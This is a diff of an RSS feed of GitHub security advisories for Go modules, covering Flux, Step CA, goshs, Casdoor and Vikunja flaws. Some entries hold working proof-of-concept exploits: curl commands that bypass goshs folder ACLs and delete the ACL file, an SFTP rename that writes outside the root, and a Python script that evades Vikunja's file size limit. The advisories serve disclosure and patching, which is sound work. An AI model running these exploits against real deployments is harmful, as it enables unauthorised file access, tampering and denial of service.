@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-04-10T19:52:14.751Z</updated>
+    <updated>2026-04-10T20:21:16.304Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,280 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/fluxcd/notification-controller] Flux notification-controller GCR Receiver missing email validation allows unauthorized reconciliation triggering]]></title>
+        <id>https://github.com/advisories/GHSA-h9cx-xjg6-5v2w</id>
+        <link href="https://github.com/advisories/GHSA-h9cx-xjg6-5v2w"/>
+        <updated>2026-04-10T20:18:17.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>The <code>gcr</code> Receiver type in Flux notification-controller does not validate the <code>email</code> claim of Google OIDC tokens used for Pub/Sub push authentication. This allows any valid Google-issued token, to authenticate against the Receiver webhook endpoint, triggering unauthorized Flux reconciliations.</p>
+<p>Exploitation requires the attacker to know the Receiver's webhook URL. The webhook path is generated as <code>/hook/sha256sum(token+name+namespace)</code>, where the token is a random string stored in a Kubernetes Secret. There is no API or endpoint that enumerates webhook URLs. An attacker cannot discover the path without either having access to the cluster and permissions to read the Receiver's <code>.status.webhookPath</code> in the target namespace, or obtaining the URL through other means (e.g. leaked secrets or access to Pub/Sub config).</p>
+<p>Upon successful authentication, the controller triggers a reconciliation for all resources listed in the Receiver's <code>.spec.resources</code>. However, the practical impact is limited: Flux reconciliation is idempotent, so if the desired state in the configured sources (Git, OCI, Helm) has not changed, the reconciliation results in a no-op with no effect on cluster state. Additionally, Flux controllers deduplicate reconciliation requests, sending many requests in a short period results in only a single reconciliation being processed.</p>
+<h3 id="patches">Patches</h3>
+<p>The fix in notification-controller v1.8.3 refactors the GCR Receiver authentication to allow users to extend the verification to <code>email</code> and <code>audience</code> claims in the JWT. This enables operators to configure their Receiver's secret with the expected GCP Service Account email and audience, which the controller will validate against the token's claims before accepting the request.</p>
+<p>Email validation example:</p>
+<pre><code class="language-yaml">apiVersion: v1
+kind: Secret
+metadata:
+  name: gcr-webhook-token
+  namespace: apps
+type: Opaque
+stringData:
+  token: &lt;random token&gt;
+  email: &lt;service-account&gt;@&lt;project&gt;.iam.gserviceaccount.com
+  audience: https://&lt;hostname&gt;/hook/&lt;sha256(token+name+namespace)&gt;
+</code></pre>
+<p>For more information, please see the GCR Receiver documentation: <a href="https://fluxcd.io/flux/components/notification/receivers/#gcr">https://fluxcd.io/flux/components/notification/receivers/#gcr</a></p>
+<h3 id="credits">Credits</h3>
+<p>Thanks to Saroj Khadka for reporting this issue to the Flux Security Team.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/fluxcd/notification-controller/security/advisories/GHSA-h9cx-xjg6-5v2w">https://github.com/fluxcd/notification-controller/security/advisories/GHSA-h9cx-xjg6-5v2w</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40109">https://nvd.nist.gov/vuln/detail/CVE-2026-40109</a></li>
+<li><a href="https://github.com/fluxcd/notification-controller/pull/1279">https://github.com/fluxcd/notification-controller/pull/1279</a></li>
+<li><a href="https://github.com/fluxcd/notification-controller/releases/tag/v1.8.3">https://github.com/fluxcd/notification-controller/releases/tag/v1.8.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-h9cx-xjg6-5v2w">https://github.com/advisories/GHSA-h9cx-xjg6-5v2w</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h9cx-xjg6-5v2w</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-04-10T20:18:16.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/smallstep/certificates] Step CA affected by an index out of bounds panic in TPM attestation EKU validation]]></title>
+        <id>https://github.com/advisories/GHSA-9qq8-cgcv-qmc9</id>
+        <link href="https://github.com/advisories/GHSA-9qq8-cgcv-qmc9"/>
+        <updated>2026-04-10T20:18:09.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
+<p>An attacker can trigger an index out-of-bounds panic in Step CA by sending a crafted attestation key (AK) certificate with an empty Extended Key Usage (EKU) extension during TPM device attestation.</p>
+<h2 id="details">Details</h2>
+<p>When processing a device-attest-01 ACME challenge using TPM attestation, Step CA validates that the AK certificate contains the tcg-kp-AIKCertificate Extended Key Usage OID. During this validation, the EKU extension value is decoded from its ASN.1 representation and the first element is checked. A crafted certificate could include an EKU extension that decodes to an empty sequence, causing the code to panic when accessing the first element of the empty slice.</p>
+<p>This vulnerability is only reachable when a device-attest-01 ACME challenge with TPM attestation is configured. Deployments not using TPM device attestation are not affected.</p>
+<h2 id="mitigations">Mitigations</h2>
+<p>If you are unable to upgrade to v0.30.0 or newer, the attack can be mitigated by disabling or removing any ACME provisioners that use TPM device attestation (device-attest-01).</p>
+<h2 id="fix">Fix</h2>
+<p>In v0.30.0, a bounds check was added to validateAKCertificateExtendedKeyUsage so that an empty EKU sequence is treated as a validation failure rather than causing a panic.</p>
+<h2 id="acknowledgements">Acknowledgements</h2>
+<p>This issue was identified and reported by @1seal (Oleh Konko).</p>
+<h2 id="embargo-list">Embargo List</h2>
+<p>If your organization runs Step CA in production and would like advance, embargoed notification of future security updates, visit <a href="https://u.step.sm/disclosure">https://u.step.sm/disclosure</a> to request inclusion on our embargo list.</p>
+<p>Stay safe, and thank you for helping us keep the ecosystem secure.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/smallstep/certificates/security/advisories/GHSA-9qq8-cgcv-qmc9">https://github.com/smallstep/certificates/security/advisories/GHSA-9qq8-cgcv-qmc9</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40097">https://nvd.nist.gov/vuln/detail/CVE-2026-40097</a></li>
+<li><a href="https://github.com/smallstep/certificates/pull/2569">https://github.com/smallstep/certificates/pull/2569</a></li>
+<li><a href="https://github.com/smallstep/certificates/commit/ffd31ac0a87e03b0224cb8363094bfe602242888">https://github.com/smallstep/certificates/commit/ffd31ac0a87e03b0224cb8363094bfe602242888</a></li>
+<li><a href="https://github.com/smallstep/certificates/releases/tag/v0.30.0">https://github.com/smallstep/certificates/releases/tag/v0.30.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-9qq8-cgcv-qmc9">https://github.com/advisories/GHSA-9qq8-cgcv-qmc9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9qq8-cgcv-qmc9</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-04-10T20:18:08.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/patrickhener/goshs] goshs has a file-based ACL authorization bypass in goshs state-changing routes]]></title>
+        <id>https://github.com/advisories/GHSA-wvhv-qcqf-f3cx</id>
+        <link href="https://github.com/advisories/GHSA-wvhv-qcqf-f3cx"/>
+        <updated>2026-04-10T20:00:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>goshs enforces the documented per-folder <code>.goshs</code> ACL/basic-auth mechanism for directory listings and file reads, but it does not enforce the same authorization checks for state-changing routes. An unauthenticated attacker can upload files with <code>PUT</code>, upload files with multipart <code>POST /upload</code>, create directories with <code>?mkdir</code>, and delete files with <code>?delete</code> inside a <code>.goshs</code>-protected directory. By deleting the <code>.goshs</code> file itself, the attacker can remove the folder's auth policy and then access previously protected content without credentials. This results in a critical authorization bypass affecting confidentiality, integrity, and availability.</p>
+<h3 id="details">Details</h3>
+<p>The project README explicitly documents file-based ACLs as a security feature:</p>
+<ul>
+<li><code>README.md:59</code> - "You can place a .goshs in any folder to apply custom ACLs"</li>
+<li><code>README.md:61</code> - "You can apply custom basic auth per folder"</li>
+</ul>
+<p>The read/list path correctly enforces <code>.goshs</code>:</p>
+<ul>
+<li><code>httpserver/filebased.go:10-49</code> loads <code>.goshs</code></li>
+<li><code>httpserver/handler.go:68-91</code> calls <code>findSpecialFile()</code> for directories</li>
+<li><code>httpserver/handler.go:94-101</code> calls <code>findSpecialFile()</code> for files</li>
+<li><code>httpserver/handler.go:285-305</code> applies custom auth</li>
+<li><code>httpserver/handler.go:545-565</code> enforces folder auth during directory rendering</li>
+<li><code>httpserver/handler.go:590-630</code> enforces file auth and blocked entries during file serving</li>
+</ul>
+<p>However, the state-changing routes bypass this logic entirely:</p>
+<ul>
+<li><code>httpserver/server.go:94-100</code> routes multipart <code>POST /.../upload</code> directly to <code>upload()</code></li>
+<li><code>httpserver/server.go:105-109</code> routes <code>PUT</code> directly to <code>put()</code></li>
+<li><code>httpserver/handler.go:119-123</code> dispatches <code>?mkdir</code> directly to <code>handleMkdir()</code></li>
+<li><code>httpserver/handler.go:181-187</code> dispatches <code>?delete</code> directly to <code>deleteFile()</code></li>
+<li><code>httpserver/updown.go:18-60</code> writes files for <code>PUT</code> without checking <code>.goshs</code></li>
+<li><code>httpserver/updown.go:63-165</code> writes files for multipart upload without checking <code>.goshs</code></li>
+<li><code>httpserver/handler.go:679-698</code> deletes files with <code>os.RemoveAll()</code> without checking <code>.goshs</code></li>
+<li><code>httpserver/handler.go:901-937</code> creates directories with <code>os.MkdirAll()</code> without checking <code>.goshs</code></li>
+</ul>
+<p>This is not a path traversal issue. The path remains inside the configured root after sanitization. The vulnerability is that authorization is applied inconsistently: reads are protected, but writes and deletes are not. Because <code>.goshs</code> itself can be deleted through the unauthenticated delete route, the attacker can escalate the impact from unauthorized modification to full removal of the folder's auth barrier.</p>
+<h3 id="poc">PoC</h3>
+<p>Environment used for verification:</p>
+<ul>
+<li>Repository/module: <code>github.com/patrickhener/goshs</code></li>
+<li>Verified vulnerable tag: <code>v2.0.0-beta.3</code></li>
+<li>Also present in the <code>v1.1.4</code> line based on code inspection</li>
+<li>Local host: <code>127.0.0.1:18091</code></li>
+</ul>
+<p>Build and setup:</p>
+<pre><code class="language-bash">cd '/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta3'
+go build -o /tmp/goshs_acl_verify/goshs ./
+
+rm -rf /tmp/goshs_acl_verify/root
+mkdir -p /tmp/goshs_acl_verify/root/protected
+cp integration/keepFiles/goshsACLAuth /tmp/goshs_acl_verify/root/protected/.goshs
+printf 'top secret\n' &gt; /tmp/goshs_acl_verify/root/protected/secret.txt
+
+/tmp/goshs_acl_verify/goshs -d /tmp/goshs_acl_verify/root -p 18091
+</code></pre>
+<p>In a second terminal:</p>
+<pre><code class="language-bash"># The protected folder initially requires auth
+curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:18091/protected/'
+
+# Unauthenticated write into the protected folder succeeds
+curl -s -o /dev/null -w '%{http_code}\n' -X PUT \
+  --data-binary 'injected via PUT' \
+  'http://127.0.0.1:18091/protected/put-created.txt'
+
+# Unauthenticated deletion of the ACL file succeeds
+curl -s -o /dev/null -w '%{http_code}\n' \
+  'http://127.0.0.1:18091/protected/.goshs?delete'
+
+# The previously protected file is now publicly accessible
+curl -s -o /dev/null -w '%{http_code}\n' \
+  'http://127.0.0.1:18091/protected/secret.txt'
+curl -s 'http://127.0.0.1:18091/protected/secret.txt'
+</code></pre>
+<p>Expected results:</p>
+<pre><code class="language-text">401
+200
+200
+200
+top secret
+</code></pre>
+<img src="https://github.com/user-attachments/assets/37576067-fa90-44f6-8fe5-dcb7c96b9704" alt="goshs_poc1" height="657" width="1280">
+
+
+<p>Note: if using <code>zsh</code>, the URL containing <code>?delete</code> must be quoted, or the shell will treat <code>?</code> as a wildcard and the request will not be sent.</p>
+<p>PoC Video for reference:</p>
+<p><a href="https://github.com/user-attachments/assets/deb9106e-6dfa-47c0-95c1-993c2cbc9ee7">https://github.com/user-attachments/assets/deb9106e-6dfa-47c0-95c1-993c2cbc9ee7</a></p>
+<h3 id="impact">Impact</h3>
+<p>This is an authorization bypass affecting deployments that rely on <code>.goshs</code> for per-folder protection. A remote unauthenticated attacker can:</p>
+<ul>
+<li>create or overwrite files inside a folder that should require authentication</li>
+<li>create directories inside the protected folder</li>
+<li>delete arbitrary files reachable through the vulnerable route inside that protected folder</li>
+<li>delete the <code>.goshs</code> policy file itself</li>
+<li>read previously protected files once the policy file has been removed</li>
+</ul>
+<p>In practice, this breaks the security boundary promised by the file-based ACL feature and can expose sensitive files while also allowing unauthorized modification or destruction of protected content.</p>
+<h3 id="remediation">Remediation</h3>
+<ol>
+<li>Enforce <code>.goshs</code> authorization checks for all state-changing operations, not just read/list flows. Before <code>PUT</code>, multipart upload, delete, and mkdir, resolve the effective folder ACL and deny the request unless the caller satisfies <code>acl.Auth</code>.</li>
+<li>Protect <code>.goshs</code> as a special file in mutation handlers. The application already prevents serving <code>.goshs</code>; it should also reject deletion, overwrite, or replacement of <code>.goshs</code> through HTTP routes unless the request is properly authorized.</li>
+<li>Add regression tests covering protected folders for every mutation path. The test suite should verify that <code>PUT</code>, <code>POST /upload</code>, <code>?delete</code>, and <code>?mkdir</code> all fail without valid credentials when a <code>.goshs</code> file is present.</li>
+</ol>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/patrickhener/goshs/security/advisories/GHSA-wvhv-qcqf-f3cx">https://github.com/patrickhener/goshs/security/advisories/GHSA-wvhv-qcqf-f3cx</a></li>
+<li><a href="https://github.com/patrickhener/goshs/commit/f212c4f4a126556bab008f79758e21a839ef2c0f">https://github.com/patrickhener/goshs/commit/f212c4f4a126556bab008f79758e21a839ef2c0f</a></li>
+<li><a href="https://github.com/patrickhener/goshs/releases/tag/v2.0.0-beta.4">https://github.com/patrickhener/goshs/releases/tag/v2.0.0-beta.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-wvhv-qcqf-f3cx">https://github.com/advisories/GHSA-wvhv-qcqf-f3cx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-wvhv-qcqf-f3cx</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-10T20:00:32.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/patrickhener/goshs] goshs is Missing Write Protection for Parametric Data Values]]></title>
+        <id>https://github.com/advisories/GHSA-2943-crp8-38xx</id>
+        <link href="https://github.com/advisories/GHSA-2943-crp8-38xx"/>
+        <updated>2026-04-10T20:00:30.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The SFTP command rename sanitizes only the source path and not the destination, so it is possible to write outside of the root directory of the SFTP. </p>
+<h3 id="details">Details</h3>
+<p>Here is the issue:</p>
+<pre><code class="language-go">// helper.go:155-215
+func cmdFile(root string, r *sftp.Request, ip string, sftpServer *SFTPServer) error {
+    fullPath, err := sanitizePath(r.Filepath, root)  // Source: SANITIZED
+    if err != nil {
+        return err
+    }
+    switch r.Method {
+    // ...
+    case "Rename":
+        err := os.Rename(fullPath, r.Target)  // Destination: NOT SANITIZED!
+</code></pre>
+<h3 id="poc">PoC</h3>
+<p>To exploit just upload a file on the SFTP and rename it to a file with full path. </p>
+<p>Currently no key.txt file inside /tmp</p>
+<pre><code class="language-bash">$ ls key.txt
+ls: key.txt: No such file or directory
+</code></pre>
+<p>Start the SFTP server:</p>
+<pre><code class="language-bash">/tmp/sftp-server $ goshs -sftp -b 'user:user' -d .
+WARNING[2026-04-02 20:00:18] upload-folder mode deactivated due to use of 'sftp' mode
+WARNING[2026-04-02 20:00:18] There is a newer Version (v2.0.0-beta.3) of goshs available. Run --update to update goshs.
+INFO   [2026-04-02 20:00:18] Starting SFTP server on port 0.0.0.0:2022
+WARNING[2026-04-02 20:00:18] You are using basic auth without SSL. Your credentials will be transferred in cleartext. Consider using -s, too.
+INFO   [2026-04-02 20:00:18] Using basic auth with user 'user' and password 'user'
+INFO   [2026-04-02 20:00:18] Download embedded file at: /example.txt?embedded
+INFO   [2026-04-02 20:00:18] Serving on interface lo0 bound to 127.0.0.1:8000
+INFO   [2026-04-02 20:00:18] Serving on interface en0 bound to 192.168.68.51:8000
+INFO   [2026-04-02 20:00:18] Serving HTTP from /tmp/sftp-server
+</code></pre>
+<p>Connect to the SFTP and uploading the file:</p>
+<pre><code class="language-bash">$ sftp -P 2022 user@localhost
+user@localhost's password:
+Connected to localhost.
+sftp&gt; put /Users/user/Downloads/key.txt
+Uploading /Users/user/Downloads/key.txt to /tmp/sftp-server/key.txt
+key.txt                                                                                                                                                   100%   15    40.9KB/s   00:00
+</code></pre>
+<p>The file is stored properly. </p>
+<p>goshs log:</p>
+<pre><code>INFO   [2026-04-02 20:03:31] SFTP: [::1]:61742 - [Put] - "/tmp/sftp-server/key.txt"
+</code></pre>
+<p>Rename command with full path:</p>
+<pre><code class="language-bash">sftp&gt; rename key.txt /tmp/key.txt
+</code></pre>
+<p>goshs log:</p>
+<pre><code>INFO   [2026-04-02 20:04:09] SFTP: [::1]:61742 - [Rename] - "/tmp/sftp-server/key.txt to /tmp/key.txt"
+</code></pre>
+<p>Key file is now in /tmp</p>
+<pre><code>$ ls key.txt
+key.txt
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>This allows file write and can be used either for an RCE in form of overwrite an SSH key, or by overwriting a configuration etc.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/patrickhener/goshs/security/advisories/GHSA-2943-crp8-38xx">https://github.com/patrickhener/goshs/security/advisories/GHSA-2943-crp8-38xx</a></li>
+<li><a href="https://github.com/patrickhener/goshs/commit/141c188ce270ffbec087844a50e5e695b7da7744">https://github.com/patrickhener/goshs/commit/141c188ce270ffbec087844a50e5e695b7da7744</a></li>
+<li><a href="https://github.com/patrickhener/goshs/releases/tag/v2.0.0-beta.4">https://github.com/patrickhener/goshs/releases/tag/v2.0.0-beta.4</a></li>
+<li><a href="https://github.com/advisories/GHSA-2943-crp8-38xx">https://github.com/advisories/GHSA-2943-crp8-38xx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-2943-crp8-38xx</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-10T20:00:28.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/lin-snow/ech0] Ech0 has Stored XSS via SVG Upload and Content-Type Validation Bypass in File Upload]]></title>
         <id>https://github.com/advisories/GHSA-69hx-63pv-f8f4</id>
@@ -2240,143 +2514,5 @@ curl -s "http://localhost:8090/api/beszel/containers/info?system=$SYSTEM_A_ID&am
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-04-10T15:36:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/casdoor/casdoor] Casdoor vulnerable to Stored XSS via Application formCss / formSideHtml]]></title>
-        <id>https://github.com/advisories/GHSA-w799-7525-rpr6</id>
-        <link href="https://github.com/advisories/GHSA-w799-7525-rpr6"/>
-        <updated>2026-04-10T15:36:40.000Z</updated>
-        <content type="html"><![CDATA[<p>A security flaw has been discovered in Casdoor 2.356.0. This affects the function dangerouslySetInnerHTML. Performing a manipulation of the argument formCss/formCssMobile/formSideHtml results in cross site scripting. The attack can be initiated remotely. The exploit has been released to the public and may be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5468">https://nvd.nist.gov/vuln/detail/CVE-2026-5468</a></li>
-<li><a href="https://vuldb.com/submit/781770">https://vuldb.com/submit/781770</a></li>
-<li><a href="https://vuldb.com/vuln/355072">https://vuldb.com/vuln/355072</a></li>
-<li><a href="https://vuldb.com/vuln/355072/cti">https://vuldb.com/vuln/355072/cti</a></li>
-<li><a href="https://github.com/advisories/GHSA-w799-7525-rpr6">https://github.com/advisories/GHSA-w799-7525-rpr6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w799-7525-rpr6</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-04-03T15:30:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/casdoor/casdoor] Casdoor vulnerable to Open Redirect]]></title>
-        <id>https://github.com/advisories/GHSA-mj24-pqx2-6788</id>
-        <link href="https://github.com/advisories/GHSA-mj24-pqx2-6788"/>
-        <updated>2026-04-10T15:36:29.000Z</updated>
-        <content type="html"><![CDATA[<p>A vulnerability was identified in Casdoor 2.356.0. Affected by this issue is some unknown functionality of the component OAuth Authorization Request Handler. Such manipulation of the argument redirect_uri leads to open redirect. It is possible to launch the attack remotely. The exploit is publicly available and might be used. The vendor was contacted early about this disclosure but did not respond in any way.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5467">https://nvd.nist.gov/vuln/detail/CVE-2026-5467</a></li>
-<li><a href="https://vuldb.com/submit/781769">https://vuldb.com/submit/781769</a></li>
-<li><a href="https://vuldb.com/vuln/355071">https://vuldb.com/vuln/355071</a></li>
-<li><a href="https://vuldb.com/vuln/355071/cti">https://vuldb.com/vuln/355071/cti</a></li>
-<li><a href="https://github.com/advisories/GHSA-mj24-pqx2-6788">https://github.com/advisories/GHSA-mj24-pqx2-6788</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mj24-pqx2-6788</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-04-03T12:31:10.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/casdoor/casdoor] Casdoor vulnerable to SSRF via crafted Webhook URL]]></title>
-        <id>https://github.com/advisories/GHSA-p8c7-hjc4-gwf8</id>
-        <link href="https://github.com/advisories/GHSA-p8c7-hjc4-gwf8"/>
-        <updated>2026-04-10T15:36:19.000Z</updated>
-        <content type="html"><![CDATA[<p>A weakness has been identified in Casdoor 2.356.0. This vulnerability affects unknown code of the component Webhook URL Handler. Executing a manipulation can lead to server-side request forgery. The attack can be launched remotely. The vendor was contacted early about this disclosure but did not respond in any way.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-5469">https://nvd.nist.gov/vuln/detail/CVE-2026-5469</a></li>
-<li><a href="https://vuldb.com/submit/781771">https://vuldb.com/submit/781771</a></li>
-<li><a href="https://vuldb.com/vuln/355073">https://vuldb.com/vuln/355073</a></li>
-<li><a href="https://vuldb.com/vuln/355073/cti">https://vuldb.com/vuln/355073/cti</a></li>
-<li><a href="https://github.com/advisories/GHSA-p8c7-hjc4-gwf8">https://github.com/advisories/GHSA-p8c7-hjc4-gwf8</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-p8c7-hjc4-gwf8</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-03T15:30:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[code.vikunja.io/api] Vikunja has File Size Limit Bypass via Vikunja Import]]></title>
-        <id>https://github.com/advisories/GHSA-qh78-rvg3-cv54</id>
-        <link href="https://github.com/advisories/GHSA-qh78-rvg3-cv54"/>
-        <updated>2026-04-10T19:46:03.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The Vikunja file import endpoint uses the attacker-controlled <code>Size</code> field from the JSON metadata inside the import zip instead of the actual decompressed file content length for the file size enforcement check. By setting <code>Size</code> to 0 in the JSON while including large compressed file entries in the zip, an attacker bypasses the configured maximum file size limit.</p>
-<h2 id="details">Details</h2>
-<p>During import, the JSON metadata from <code>data.json</code> inside the zip archive is deserialized into project structures. File content is read independently from the zip entries. When creating attachments, the code at <code>pkg/modules/migration/create_from_structure.go:406</code> passes the attacker-controlled <code>File.Size</code> from the JSON:</p>
-<pre><code class="language-go">err = a.NewAttachment(s, bytes.NewReader(a.File.FileContent), a.File.Name, a.File.Size, user)
-</code></pre>
-<p>The file size enforcement check at <code>pkg/files/files.go:118</code> then evaluates this attacker-controlled value:</p>
-<pre><code class="language-go">if realsize &gt; config.GetMaxFileSizeInMBytes()*uint64(datasize.MB) &amp;&amp; checkFileSizeLimit {
-</code></pre>
-<p>With <code>Size</code> set to 0 in the JSON, the comparison <code>0 &gt; 20MB</code> evaluates to false and the check passes. The actual file content (from the zip entry) can be up to 500MB per entry (the <code>readZipEntry</code> limit). Highly compressible content like zero-filled buffers achieves extreme compression ratios, allowing a small zip upload to store gigabytes of data.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<p>Tested on Vikunja v2.2.2 with default <code>max_file_size: 20MB</code>.</p>
-<pre><code class="language-python">import zipfile, io, json, requests
-
-TARGET = "http://localhost:3456"
-token = requests.post(f"{TARGET}/api/v1/login",
-    json={"username": "user1", "password": "User1pass!"}).json()["token"]
-h = {"Authorization": f"Bearer {token}"}
-
-# Craft zip with forged Size=0 in JSON but 25MB actual content
-large_content = b"A" * (25 * 1024 * 1024)  # 25MB
-data = [{"title": "Project", "tasks": [{"title": "Task", "attachments": [{
-    "file": {"name": "large.bin", "size": 0, "created": "2026-01-01T00:00:00Z"},
-    "created": "2026-01-01T00:00:00Z"}]}]}]
-
-zip_buf = io.BytesIO()
-with zipfile.ZipFile(zip_buf, 'w', zipfile.ZIP_DEFLATED) as zf:
-    zf.writestr("VERSION", "2.2.2")
-    zf.writestr("data.json", json.dumps(data))
-    zf.writestr("large.bin", large_content)
-
-resp = requests.put(f"{TARGET}/api/v1/migration/vikunja-file/migrate",
-    headers=h,
-    files={"import": ("export.zip", zip_buf.getvalue(), "application/zip")})
-</code></pre>
-<p>Output:</p>
-<pre><code>HTTP 200: {"message": "Everything was migrated successfully."}
-25MB file stored despite 20MB server limit.
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An authenticated user can exhaust server storage by uploading small compressed zip files that decompress into files exceeding the configured maximum file size limit. A single ~25KB upload can store ~25MB due to zip compression ratios. Repeated exploitation can fill the server's disk, causing denial of service for all users. No per-user storage quota exists to contain the impact.</p>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Use the actual content length instead of the attacker-controlled <code>Size</code> field:</p>
-<pre><code class="language-go">err = a.NewAttachment(s, bytes.NewReader(a.File.FileContent), a.File.Name, uint64(len(a.File.FileContent)), user)
-</code></pre>
-<hr>
-<p><em>Found and reported by <a href="https://aisafe.io">aisafe.io</a></em></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-qh78-rvg3-cv54">https://github.com/go-vikunja/vikunja/security/advisories/GHSA-qh78-rvg3-cv54</a></li>
-<li><a href="https://github.com/go-vikunja/vikunja/pull/2575">https://github.com/go-vikunja/vikunja/pull/2575</a></li>
-<li><a href="https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0">https://github.com/go-vikunja/vikunja/releases/tag/v2.3.0</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35602">https://nvd.nist.gov/vuln/detail/CVE-2026-35602</a></li>
-<li><a href="https://github.com/advisories/GHSA-qh78-rvg3-cv54">https://github.com/advisories/GHSA-qh78-rvg3-cv54</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-qh78-rvg3-cv54</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-04-10T15:35:18.000Z</published>
     </entry>
 </feed>
